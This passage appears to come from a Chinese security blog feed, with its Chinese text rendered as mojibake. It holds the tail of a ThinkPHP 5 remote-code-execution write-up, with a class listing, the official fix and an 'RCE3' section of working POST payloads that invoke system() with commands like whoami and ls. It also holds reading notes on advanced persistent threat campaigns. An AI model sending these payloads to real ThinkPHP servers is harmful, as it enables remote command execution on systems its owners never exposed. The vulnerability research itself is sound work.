RegexIterator </span><br><span class="line">RecursiveRegexIterator          RecursiveRegexIterator </span><br><span class="line">EmptyIterator                   EmptyIterator </span><br><span class="line">RecursiveTreeIterator           RecursiveTreeIterator </span><br><span class="line">ArrayObject                     ArrayObject </span><br><span class="line">ArrayIterator                   ArrayIterator </span><br><span class="line">RecursiveArrayIterator          RecursiveArrayIterator </span><br><span class="line">SplFileInfo                     SplFileInfo </span><br><span class="line">DirectoryIterator               DirectoryIterator </span><br><span class="line">FilesystemIterator              FilesystemIterator </span><br><span class="line">RecursiveDirectoryIterator      RecursiveDirectoryIterator </span><br><span class="line">GlobIterator                    GlobIterator </span><br><span class="line">SplFileObject                   SplFileObject </span><br><span class="line">SplTempFileObject               SplTempFileObject </span><br><span class="line">SplDoublyLinkedList             SplDoublyLinkedList </span><br><span class="line">SplQueue                        SplQueue </span><br><span class="line">SplStack                        SplStack </span><br><span class="line">SplHeap                         SplHeap </span><br><span class="line">SplMinHeap                      SplMinHeap </span><br><span class="line">SplMaxHeap                      SplMaxHeap </span><br><span class="line">SplPriorityQueue                SplPriorityQueue </span><br><span class="line">SplFixedArray                   SplFixedArray </span><br><span class="line">SplObjectStorage                SplObjectStorage </span><br><span class="line">MultipleIterator                MultipleIterator </span><br><span class="line">SessionHandler                  SessionHandler </span><br><span class="line">ReflectionException             ReflectionException </span><br><span class="line">Reflection                      Reflection </span><br><span class="line">ReflectionFunctionAbstract      ReflectionFunctionAbstract </span><br><span class="line">ReflectionFunction              ReflectionFunction </span><br><span class="line">ReflectionParameter             ReflectionParameter </span><br><span class="line">ReflectionMethod                ReflectionMethod </span><br><span class="line">ReflectionClass                 ReflectionClass </span><br><span class="line">ReflectionObject                ReflectionObject </span><br><span class="line">ReflectionProperty              ReflectionProperty </span><br><span class="line">ReflectionExtension             ReflectionExtension </span><br><span class="line">ReflectionZendExtension         ReflectionZendExtension </span><br><span class="line">__PHP_Incomplete_Class          __PHP_Incomplete_Class </span><br><span class="line">php_user_filter                 php_user_filter </span><br><span class="line">Directory                       Directory </span><br><span class="line">SimpleXMLElement                SimpleXMLElement </span><br><span class="line">SimpleXMLIterator               SimpleXMLIterator </span><br><span class="line">SoapClient                      SoapClient </span><br><span class="line">SoapVar                         SoapVar </span><br><span class="line">SoapServer                      SoapServer </span><br><span class="line">SoapFault                       SoapFault </span><br><span class="line">SoapParam                       SoapParam </span><br><span class="line">SoapHeader                      SoapHeader </span><br><span class="line">PharException                   PharException </span><br><span class="line">Phar                            Phar </span><br><span class="line">PharData                        PharData </span><br><span class="line">PharFileInfo                    PharFileInfo </span><br><span class="line">XMLReader                       XMLReader </span><br><span class="line">XMLWriter                       XMLWriter </span><br><span class="line">ZipArchive                      ZipArchive </span><br><span class="line">PDOException                    PDOException </span><br><span class="line">PDO                             PDO </span><br><span class="line">PDOStatement                    PDOStatement </span><br><span class="line">PDORow                          PDORow </span><br><span class="line">CURLFile                        CURLFile </span><br><span class="line">Collator                        Collator </span><br><span class="line">NumberFormatter                 NumberFormatter </span><br><span class="line">Normalizer                      Normalizer </span><br><span class="line">Locale                          Locale </span><br><span class="line">MessageFormatter                MessageFormatter </span><br><span class="line">IntlDateFormatter               IntlDateFormatter </span><br><span class="line">ResourceBundle                  ResourceBundle </span><br><span class="line">Transliterator                  Transliterator </span><br><span class="line">IntlTimeZone                    IntlTimeZone </span><br><span class="line">IntlCalendar                    IntlCalendar </span><br><span class="line">IntlGregorianCalendar           IntlGregorianCalendar </span><br><span class="line">Spoofchecker                    Spoofchecker </span><br><span class="line">IntlException                   IntlException </span><br><span class="line">IntlIterator                    IntlIterator </span><br><span class="line">IntlBreakIterator               IntlBreakIterator </span><br><span class="line">IntlRuleBasedBreakIterator      IntlRuleBasedBreakIterator </span><br><span class="line">IntlCodePointBreakIterator      IntlCodePointBreakIterator </span><br><span class="line">IntlPartsIterator               IntlPartsIterator </span><br><span class="line">UConverter                      UConverter </span><br><span class="line">JsonIncrementalParser           JsonIncrementalParser </span><br><span class="line">mysqli_sql_exception            mysqli_sql_exception </span><br><span class="line">mysqli_driver                   mysqli_driver </span><br><span class="line">mysqli                          mysqli </span><br><span class="line">mysqli_warning                  mysqli_warning </span><br><span class="line">mysqli_result                   mysqli_result </span><br><span class="line">mysqli_stmt                     mysqli_stmt </span><br><span class="line">Composer\Autoload\ComposerStaticInit81a0c33d33d83a86fdd976e2aff753d9            Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c </span><br><span class="line">think\Loader                    think\Loader</span><br><span class="line">think\Error                     think\Error </span><br><span class="line">think\Container                 think\Config </span><br><span class="line">think\App                       think\App </span><br><span class="line">think\Env                       think\Request </span><br><span class="line">think\Config                    think\Hook </span><br><span class="line">think\Hook                      think\Env </span><br><span class="line">think\Facade                    think\Lang </span><br><span class="line">think\facade\Env                think\Log </span><br><span class="line">env                             think\Route</span><br><span class="line">think\Db </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\facade\Route </span><br><span class="line">route </span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule </span><br><span class="line">think\route\RuleGroup </span><br><span class="line">think\route\Domain </span><br><span class="line">think\route\RuleItem </span><br><span class="line">think\route\RuleName </span><br><span class="line">think\route\Dispatch </span><br><span class="line">think\route\dispatch\Url </span><br><span class="line">think\route\dispatch\Module </span><br><span class="line">think\Middleware </span><br><span class="line">think\Cookie </span><br><span class="line">think\View </span><br><span class="line">think\view\driver\Think </span><br><span class="line">think\Template </span><br><span class="line">think\template\driver\File </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File </span><br><span class="line">think\Session </span><br><span class="line">think\Debug </span><br><span class="line">think\Cache </span><br><span class="line">think\cache\Driver </span><br><span class="line">think\cache\driver\File </span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ€»ç»“-1"><a href="#åˆ©ç”¨æ€»ç»“-1" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p>by Mochazz:</p><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/8.png" alt="8"></p><h2 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><blockquote><p>ä»£ç å±‚é¢ï¼šå¢åŠ å¯¹æ§åˆ¶å™¨åçš„åˆæ³•æ€§æ£€æŸ¥ã€‚</p><p>åº”æ€¥å±‚é¢ï¼šä¸´æ—¶å¼€å¯å¼ºåˆ¶è·¯ç”±ã€‚</p></blockquote><p>å®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯ï¼šå¢åŠ æ­£åˆ™è¡¨è¾¾å¼ <code>^[A-Za-z](\w)*$</code> ï¼Œå¯¹æ§åˆ¶å™¨åè¿›è¡Œåˆæ³•æ€§æ£€æµ‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><h1 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h1><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23ã€5.1.0 &lt;&#x3D; 5.1.16 éœ€è¦å¼€å¯æ¡†æ¶app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 éœ€è¦å­˜åœ¨xxxçš„methodè·¯ç”±ï¼Œä¾‹å¦‚captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls+-al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´æ¦‚è¿°-2"><a href="#æ¼æ´æ¦‚è¿°-2" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>å’Œä¸Šä¸€ä¸ªRCEç›´æ¥åŸå› ä¸€æ ·ï¼Œéƒ½æ˜¯æ²¡æœ‰å¯¹æ§åˆ¶å™¨è¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒã€‚</p><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> åº•å±‚æ²¡æœ‰å¯¹æ§åˆ¶å™¨åè¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´åœ¨æœªå¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><h2 id="å½±å“ç‰ˆæœ¬-2"><a href="#å½±å“ç‰ˆæœ¬-2" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><h2 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h2 id="åˆ©ç”¨æ€»ç»“-2"><a href="#åˆ©ç”¨æ€»ç»“-2" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><h2 id="æ¼æ´ä¿®å¤-2"><a href="#æ¼æ´ä¿®å¤-2" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸»è¦å‚è€ƒèµ„æ–™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln/&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;RCE1-åˆ©ç”¨ç¼“å­˜æ–‡ä»¶G</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="RCE" scheme="https://hack-for.fun/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šé€è§†APTã€‹è¯»ä¹¦ç¬”è®°</title>
    <link href="https://hack-for.fun/0.html"/>
    <id>https://hack-for.fun/0.html</id>
    <published>2020-09-20T16:00:00.000Z</published>
    <updated>2020-09-22T02:51:54.505Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png"></p><h1 id="ã€Šé€è§†APTã€‹"><a href="#ã€Šé€è§†APTã€‹" class="headerlink" title="ã€Šé€è§†APTã€‹"></a>ã€Šé€è§†APTã€‹</h1><h2 id="ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—"><a href="#ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—" class="headerlink" title="ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—"></a>ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—</h2><h3 id="APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€"><a href="#APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€" class="headerlink" title="APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€"></a>APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€</h3><ul><li>ç›®æ ‡ç³»ç»Ÿï¼šå·¥æ§ç³»ç»Ÿ</li><li>æ½œä¼æ¸—é€ï¼šæ„ŸæŸ“äº†ä¼Šæœ—å¢ƒå†…60%çš„PC</li><li>çªç ´ç‰©ç†éš”ç¦»ï¼šUç›˜(ç—…æ¯’æ£€æµ‹åˆ°å®¿ä¸»æœºæ’ä¸ŠUç›˜åˆ™ä¸»åŠ¨å‘Uç›˜æ„ŸæŸ“ç—…æ¯’)</li><li>æŠ€æœ¯æ°´å¹³ï¼šåŒæ—¶åˆ©ç”¨å¤šä¸ª0day(å¾®è½¯å’Œè¥¿é—¨å­å·¥æ§ç³»ç»Ÿ)ï¼Œä½“ç°äº†APTçš„é«˜çº§æ€§</li><li>æ”»å‡»è€…ï¼šææœ‰å¯èƒ½æ˜¯æ•Œå¯¹å…³ç³»çš„æ”¿æ²»åŠ¿åŠ›</li><li>æ”»å‡»æŒç»­æ€§ï¼šC2æœåŠ¡å™¨2005.11å°±å®Œæˆæ³¨å†Œ,å¯èƒ½é•¿è¾¾6~7å¹´</li></ul><h3 id="APTæ”»å‡»çš„æ¦‚å¿µ"><a href="#APTæ”»å‡»çš„æ¦‚å¿µ" class="headerlink" title="APTæ”»å‡»çš„æ¦‚å¿µ"></a>APTæ”»å‡»çš„æ¦‚å¿µ</h3><ul><li><p>èµ·æº</p><ul><li>ç”±ç¾å›½ä¸€åç©ºå†›ä¸Šæ ¡2006å¹´æå‡º</li></ul></li><li><p>ä½•æ—¶å¼•èµ·å…³æ³¨ã€é«˜æ½®</p><ul><li>2010ä¼Šæœ—éœ‡ç½‘ç—…æ¯’ã€2013ç¾å›½â€æ£±é•œé—¨â€äº‹ä»¶</li></ul></li><li><p>å®šä¹‰</p><ul><li><p>çŸ¥åç¬¬ä¸‰æ–¹æœºæ„</p><ul><li><p>ç»´åŸºç™¾ç§‘ã€Mandiantã€èµ›é—¨é“å…‹ã€Damballaã€TechTarget</p><ul><li>1.ç‰¹æ€§ï¼šé«˜çº§ã€æŒç»­ã€å¨èƒã€é’ˆå¯¹ã€‚</li></ul></li></ul></li></ul></li></ul><p>2.ç›®æ ‡åŠ¨æœºï¼šæ”¿æ²»ã€æƒ…æŠ¥ã€æ•°æ®ã€ç»æµåˆ©ç›Š<br>3.APTç›®æ ‡ï¼šå›½é˜²ã€åˆ¶é€ ä¸šã€é‡‘èã€ç§‘ç ”</p><pre><code>- å¥‡å®‰ä¿¡å¨èƒæƒ…æŠ¥ä¸­å¿ƒ    - ä¸æ˜¯ä¸€ä¸ªçº¯ç²¹çš„æŠ€æœ¯æ¦‚å¿µï¼Œæ³›æŒ‡æœ‰ç»„ç»‡ï¼Œæœ‰è®¡åˆ’é’ˆå¯¹ç‰¹å®šç›®æ ‡çš„ä¸€ç³»åˆ—æ”»å‡»    - ç»„ç»‡        - å›½å®¶æˆ–è€…æ”¿åºœ(ç²¾ç¥æ”¯æŒå’Œç‰©è´¨åŸºç¡€)        - æƒ…æŠ¥æœºæ„ã€ç½‘ç»œé—´è°æ´»åŠ¨çš„æ”»å‡»ç»„ç»‡        - ç»æµå®ä½“ã€çŠ¯ç½ªç»„ç»‡ã€ææ€–ä¸»ä¹‰ç»„ç»‡    - èƒ½åŠ›ï¼šæ”»å‡»ä¸è®¡æˆæœ¬(æŠ€æœ¯æˆæœ¬,æ¯”å¦‚ç³»ç»Ÿ0day)    - æŠ€æœ¯ç‰¹ç‚¹ï¼šé’ˆå¯¹æ€§ã€é«˜åº¦éšè—(æ½œä¼æ¸—é€å‘¨æœŸé•¿)ã€ä¸ä»¥ç»æµåˆ©ç›Šä¸ºç›´æ¥ç›®çš„ã€æŒæ¡0day    - é‡å¤§å®‰å…¨äº‹ä»¶ä¸ä¸€å®šæ˜¯APT        - é‡å¤§æŸå¤±çš„ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯APT            - 2016å¹´ç¾å›½ä¸œéƒ¨äº’è”ç½‘ç˜«ç—ª</code></pre><p>2018å¹´Facebookæ•°æ®æ³„éœ²<br>å›½å†…é…’åº—å¤§é‡ä½æˆ·ä¿¡æ¯æ³„éœ²</p><pre><code>        - å½±å“èŒƒå›´å¤§çš„ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯APT            - 2017å¹´WannaCryå‹’ç´¢ç—…æ¯’        - é’ˆå¯¹æ€§å¼ºçš„ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯APT            - 2008å¹´8æœˆä¿„ç½—æ–¯å¯¹æ ¼é²å‰äºšçš„å†›äº‹è¡ŒåŠ¨- APT ä¸å¨èƒæƒ…æŠ¥    - å¨èƒæƒ…æŠ¥ï¼šå®‰å…¨æœºæ„æ‰€æŒæ¡çš„ã€é’ˆå¯¹ç‰¹å®šç»„ç»‡æœºæ„çš„å„ç§ç½‘ç»œå¨èƒä¿¡æ¯ï¼Œè€Œè¯¥ç»„ç»‡æœºæ„è‡ªèº«å¯èƒ½å¹¶ä¸çŸ¥é“ç›¸å…³å¨èƒçš„å­˜åœ¨æˆ–ç»†èŠ‚        - å¨èƒæƒ…æŠ¥çš„ä¸»è¦æ–¹é¢            - æºå¤´ã€ç›®æ ‡ã€åŠ¨æœºã€å·¥å…·ã€æŒ‡æ ‡ã€è¡¨è±¡ã€å½±å“ã€æ–¹æ¡ˆ</code></pre><h3 id="ç›¸å…³ç ”ç©¶"><a href="#ç›¸å…³ç ”ç©¶" class="headerlink" title="ç›¸å…³ç ”ç©¶"></a>ç›¸å…³ç ”ç©¶</h3><ul><li>åœ¨å…¨çƒèŒƒå›´å†…ï¼ŒAPTç ”ç©¶ç¾å›½å’Œä¿„ç½—æ–¯ä¸¤å›½å±ä¸–ç•Œä¸€æµï¼Œä¸­å›½å±å…¨çƒç¬¬äºŒæ¢¯é˜Ÿçš„æ’å¤´å…µ</li><li>è¡Œä¸šé¢†åŸŸï¼šå†›é˜Ÿä¸å›½é˜²ã€æ”¿åºœã€é‡‘èã€å¤–äº¤ã€èƒ½æºã€ç§‘ç ”ã€åŒ»ç–—ã€ä¼ åª’ã€ç”µä¿¡</li><li>ç›®æ ‡åœ°åŸŸï¼šå…¨çƒç»å¤§éƒ¨åˆ†çš„å›½å®¶å’Œåœ°åŒºã€‚éŸ©å›½ã€ä¸­ä¸œã€ç¾å›½ã€ä¿„ç½—æ–¯ã€å·´åŸºæ–¯å¦ç­‰å›½å®¶APTæœ€ä¸ºæ´»è·ƒ</li></ul><h2 id="APTæ”»å‡»çš„å¯¹è±¡"><a href="#APTæ”»å‡»çš„å¯¹è±¡" class="headerlink" title="APTæ”»å‡»çš„å¯¹è±¡"></a>APTæ”»å‡»çš„å¯¹è±¡</h2><h3 id="å·¥æ§ç³»ç»Ÿ"><a href="#å·¥æ§ç³»ç»Ÿ" class="headerlink" title="å·¥æ§ç³»ç»Ÿ"></a>å·¥æ§ç³»ç»Ÿ</h3><ul><li><p>ä¹Œå…‹å…°åœ£è¯å¤§åœç”µäº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šBlackEnergy åé—¨ç¨‹åºã€æ”»å‡»è€…å¯è¿œç¨‹è®¿é—®å¹¶æ“æ§ç”µåŠ›æ§åˆ¶ç³»ç»Ÿ</li></ul></li><li><p>æ²™ç‰¹é˜¿æ‹‰ä¼¯å¤§èµ¦ä¹‹å¤œæ”»å‡»äº‹ä»¶</p><ul><li><p>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šShamoon(Disttrack)ï¼Œèƒ½å¤Ÿå¯¼è‡´ç›®æ ‡ç½‘ç»œå®Œå…¨ç˜«ç—ª(é€šè¿‡å½“å‰çš„æƒé™æ¥è®¿é—®æ´»åŠ¨ç›®å½•ã€ç›¸åŒåŸŸåŠå±€åŸŸç½‘å…¶ä»–ä¸»æœºè¿›è¡Œæ¨ªå‘ç§»åŠ¨)</p><ul><li>æŠ•æ”¾å™¨(Dropper)</li><li>é€šä¿¡ç»„ä»¶(Communications)</li><li>æ“¦é™¤ç»„ä»¶(Wiper)</li></ul></li></ul></li><li><p>ç¾å›½ç”µç½‘æ‰¿åŒ…å•†æ”»å‡»äº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šæ¸—é€ç½‘ç«™ï¼Œå‘ç½‘ç«™ä¸Šä¼ æ¶æ„ç¨‹åºï¼Œåˆ©ç”¨æ¶æ„ç¨‹åºè·Ÿè¸ªç½‘ç«™è®¿é—®è€…ï¼Œè·å¾—ç›¸å…³äººå‘˜çš„è´¦å·å¯†ç ï¼Œåˆ©ç”¨è¯¥è´¦å·å‘é€å¤§é‡é’“é±¼é‚®ä»¶</li></ul></li></ul><h3 id="é‡‘èç³»ç»Ÿ"><a href="#é‡‘èç³»ç»Ÿ" class="headerlink" title="é‡‘èç³»ç»Ÿ"></a>é‡‘èç³»ç»Ÿ</h3><ul><li><p>å¤šå›½é“¶è¡Œè¢«ç›—äº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼š<br>è·å¾—é“¶è¡ŒSWIFTæƒé™ï¼Œåˆ©ç”¨SWIFIå‘å…¶ä»–é“¶è¡Œå‘é€è½¬è´¦æŒ‡ä»¤ã€ç¯¡æ”¹MT9XXæŠ¥æ–‡æ¸…é™¤è¯æ®</li></ul></li><li><p>ATM æœºç›—çªƒäº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼š</li></ul></li></ul><p>1.é’ˆå¯¹æ€§å…¥ä¾µé‡‘èæœºæ„å‘˜å·¥çš„è®¡ç®—æœºæˆ–é“¶è¡Œç½‘ç»œï¼Œè¿›è¡Œè§†é¢‘ç›‘æ§ï¼ŒæŸ¥çœ‹å’Œè®°å½•è´Ÿè´£è½¬è´¦ç³»ç»Ÿçš„é“¶è¡Œå‘˜å·¥å±å¹•ã€‚è·å–è¶³å¤Ÿçš„ä¿¡æ¯åï¼Œæ¨¡ä»¿é“¶è¡Œå‘˜å·¥çš„è¡Œä¸ºè¿›è¡Œæ¶æ„æ“ä½œã€‚<br>2.æ’å…¥ç‰¹åˆ«åˆ¶é€ çš„èŠ¯ç‰‡(EMV)å¡ï¼Œæ¤å…¥æ¶æ„ç¨‹åºï¼Œåé’çš„åŒæ—¶è®©è®¡ç®—æœºæ–­ç½‘<br>3.å…¥ä¾µå…¶ä»–èµ„äº§ï¼Œé€šè¿‡èµ„äº§å†…ä»£ç†è¿›è¡Œæˆæƒäº¤æ˜“<br>4.å…¥ä¾µå†…éƒ¨ç½‘ç»œã€è·å¾—ATMæ§åˆ¶æƒé™<br>5.é€šè¿‡å…‰é©±ã€USBæ¥å£ç­‰ç›´æ¥å¯¹ATMæœºè¿›è¡Œæ“ä½œ</p><ul><li><p>é»„é‡‘çœ¼(å›½å†…APTç»„ç»‡)è¡ŒåŠ¨äº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šä»¥åˆæ³•è½¯ä»¶å¼€å‘å…¬å¸ä¼ªè£…ï¼Œä»¥ä¸å½“ç›ˆåˆ©ä½œä¸ºç›®çš„ï¼Œé•¿æœŸä»äº‹æ•æ„Ÿé‡‘èäº¤æ˜“ä¿¡æ¯çªƒå–æ´»åŠ¨ã€‚ï¼ˆè¯¥ç»„ç»‡æ”»å‡»æ°´å¹³å’Œåä¾¦å¯Ÿèƒ½åŠ›å‡è¾¾åˆ°å›½é™…æ°´å¹³)</li></ul></li></ul><h3 id="åœ°ç¼˜æ”¿æ²»"><a href="#åœ°ç¼˜æ”¿æ²»" class="headerlink" title="åœ°ç¼˜æ”¿æ²»"></a>åœ°ç¼˜æ”¿æ²»</h3><ul><li><p>DNCé‚®ä»¶æ³„éœ²ã€ç¾å›½å¤§é€‰</p><ul><li>å¸Œæ‹‰é‡Œé‚®ä»¶é—¨äº‹ä»¶ï¼Œåˆ©ç”¨ç§äººç”µå­é‚®ä»¶å‘å®¶é‡Œç§äººæœåŠ¡å™¨å‘é€å¤§é‡æ¶‰åŠå›½å®¶æœºå¯†çš„ç»å¯†é‚®ä»¶ï¼Œå¤§çº¦6ä¸‡å°ã€‚</li><li>ç›¸å…³ç»†èŠ‚ï¼šå¸Œæ‹‰é‡Œç«é€‰å›¢é˜Ÿä¸»å¸­è¢«é’“é±¼æ”»å‡»ä¸Šé’©ï¼Œæ³„éœ²é‚®ç®±å¯†ç ï¼Œä»è€Œè·å–é‚®ç®±ä¸­çš„é‚®ä»¶ï¼ŒåŒæ ·çš„æ”»å‡»æ–¹æ³•åœ¨å›¢é˜Ÿå…¶ä»–æˆå‘˜ä¸­ä¹Ÿç›¸ç»§æˆåŠŸã€‚é’“é±¼é‚®ä»¶ä½¿ç”¨äº†(Bitly)çŸ­é“¾æ¥æŠ€æœ¯æ¥è¿›è¡Œä¼ªè£…ã€‚</li></ul></li><li><p>æ³•å›½æ€»ç»Ÿå¤§é€‰</p><ul><li>æ”»å‡»ç»„ç»‡ï¼šAPT-28<br>æ–‡æ¡£:Trumpâ€™s_Attack_On_Syria_English.docx<br>æ ¸å¿ƒæ”»å‡»æŠ€æœ¯ï¼š<br>CVE-2017-0262(Wordè¿œç¨‹ä»£ç æ‰§è¡Œ)<br>CVE-2017-0263(Windowsæœ¬åœ°æƒé™å‡çº§)</li></ul></li></ul><h3 id="æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ"><a href="#æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ" class="headerlink" title="æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ"></a>æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ</h3><ul><li>å›½å†…é¡¶å°–å¤§å­¦ã€ç ”ç©¶é™¢</li><li>å›½å†…æµ·äº‹ã€ç”µä¿¡ã€èƒ½æºã€å›½é˜²ã€å†›å·¥ä¸š</li></ul><h2 id="APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ"><a href="#APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ" class="headerlink" title="APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ"></a>APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ</h2><h3 id="APTæ”»å‡»çš„ç›®æ ‡"><a href="#APTæ”»å‡»çš„ç›®æ ‡" class="headerlink" title="APTæ”»å‡»çš„ç›®æ ‡"></a>APTæ”»å‡»çš„ç›®æ ‡</h3><ul><li><p>æ•æ„Ÿæƒ…æŠ¥ä¿¡æ¯</p><ul><li><p>PCæ•æ„Ÿæ–‡ä»¶æ‰©å±•å</p><ul><li>doc,docx,ppt,pptx,xls,xlsx,rtf,wps,et,dps,pdf,txt,dwg,rar,zip,7z,exe,eml</li></ul></li><li><p>ç§»åŠ¨ç«¯æ•æ„Ÿæ–‡ä»¶</p><ul><li>éŸ³é¢‘ã€ç…§ç‰‡ã€é€šè¯å½•éŸ³ã€å½•åƒã€é€šè¯è®°å½•ã€é€šè®¯å½•ã€çŸ­ä¿¡ã€æ‰‹æœºåŸºæœ¬ä¿¡æ¯ã€åœ°ç†ä½ç½®ä¿¡æ¯</li></ul></li><li><p>æ•æ„Ÿæƒ…æŠ¥ä¿¡æ¯çªƒå–æ–¹å¼</p><ul><li>æ ¸å¿ƒæ€æƒ³ï¼šé€‰æ‹©æ€§çªƒå–ï¼ˆæ”»å‡»è€…å¦‚æœæ´»åŠ¨å¤ªé¢‘ç¹ï¼Œæœ¨é©¬ä¸C&amp;CæœåŠ¡å™¨çš„é€šä¿¡æ¬¡æ•°è¶Šå¤šè¶Šå®¹æ˜“æš´éœ²ï¼‰ã€‚æ•…APTç»„ç»‡ä¸€èˆ¬åªæ”¶é›†ç‰¹å®šç›®å½•ä¸‹çš„æ–‡ä»¶æˆ–è€…æœ‰ç‰¹æ®Šæ–‡ä»¶åçš„æ–‡ä»¶ã€‚</li><li>æ–‡ä»¶ç›´æ¥å›ä¼ ã€Socketé€šä¿¡ã€ ç”µå­é‚®ä»¶</li></ul></li></ul></li><li><p>æ•æ„Ÿæ–‡ä»¶</p></li><li><p>ç»æµåˆ©ç›Š</p></li><li><p>æŒç»­ç›‘æ§</p></li><li><p>ç ´å</p></li><li><p>æ”»å‡»ç›®æ ‡å¹³å°</p><ul><li><p>Windowsã€Androidã€MacOSã€iOS</p></li><li><p>è·¨å¹³å°çš„æ°´å‘æ”»å‡»</p><ul><li>å¸¦æœ‰æ¶æ„ç¨‹åºçš„ä¼ªé€ Flashå‡çº§åŒ…</li></ul></li></ul></li></ul><h3 